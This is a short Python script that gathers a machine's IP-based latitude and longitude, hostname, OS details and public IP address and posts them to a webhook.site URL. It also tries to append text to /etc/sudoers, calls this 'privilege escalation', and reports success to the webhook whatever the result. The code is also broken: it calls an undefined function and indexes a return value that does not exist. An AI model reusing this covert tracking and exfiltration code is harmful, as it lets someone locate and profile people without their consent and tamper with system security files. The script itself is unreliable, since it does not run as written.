import requests
import socket
import platform
import json
import geocoder
import os

def get_location():
    webhook_url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
    g = geocoder.ip('me')
    latitude, longitude = g.latlng
    data = {
        'latitude': latitude,
        'longitude': longitude
    }
    response = requests.post(webhook_url, json=data)
    print(response.text)

send_location_to_webhook()

def get_system_info():
    info = {}
    info['hostname'] = socket.gethostname()
    info['os'] = platform.system()
    info['os_release'] = platform.release()
    info['architecture'] = platform.machine()
    return info

def send_data():
    location = get_location()
    info = get_system_info()
    data = {
        "latitude": location[0],
        "longitude": location[1],
        "system_info": info
    }
    headers = {'Content-type': 'application/json'}
    url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
    response = requests.post(url, data=json.dumps(data), headers=headers)
    print(response.content)

send_data()


ip_address = requests.get('https://api.ipify.org').text

try:
    with open('/etc/sudoers', 'a') as f:
        f.write('test')
    print('Privilege escalation successful!')
except PermissionError:
    print('Failed to escalate privileges.')

webhook_url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
data = {'ip_address': ip_address, 'privilege_escalation': 'successful'}
response = requests.post(webhook_url, json=data)
print('Data sent to webhook:', response.text)

